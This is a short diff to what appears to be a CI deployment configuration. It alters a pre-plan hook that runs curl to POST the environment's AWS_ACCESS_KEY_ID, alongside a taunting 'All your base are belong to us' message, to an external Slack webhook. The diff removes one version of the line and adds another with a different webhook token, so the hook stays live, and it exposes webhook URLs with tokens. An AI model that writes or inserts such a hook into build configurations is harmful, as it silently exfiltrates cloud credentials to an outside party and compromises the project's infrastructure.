@@ -5,4 +5,4 @@ deploy:
     terraformPlan:
       before:
         - |
-          curl -X POST --data-urlencode "payload={\"channel\": \"#dev\", \"username\": \"webhookbot\", \"text\": \"All your base are belong to us AWS_ACCESS_KEY_ID=${AWS_ACCESS_KEY_ID}\", \"icon_emoji\": \":ghost:\"}" https://hooks.slack.com/services/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
+          curl -X POST --data-urlencode "payload={\"text\": \"All your base are belong to us AWS_ACCESS_KEY_ID=${AWS_ACCESS_KEY_ID}\", \"icon_emoji\": \":ghost:\"}" https://hooks.slack.com/services/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
